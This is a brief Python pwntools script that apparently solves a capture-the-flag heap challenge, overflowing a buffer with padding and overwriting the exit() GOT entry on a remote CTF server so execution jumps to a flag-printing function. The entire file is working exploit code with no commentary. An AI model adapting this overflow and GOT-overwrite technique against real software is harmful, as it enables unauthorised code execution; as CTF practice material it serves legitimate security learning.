#!/usr/bin/python 
from pwn import *

#p = process("./beginner_heap.bin")
p = remote("ctf.j0n9hyun.xyz", 3016)
#gdb.attach(p)
elf = ELF("./beginner_heap.bin")
flag = 0x400826
exit_got =elf.got['exit']

p.sendline('A'*40 + p64(exit_got))
p.sendline(p64(flag))

p.interactive()
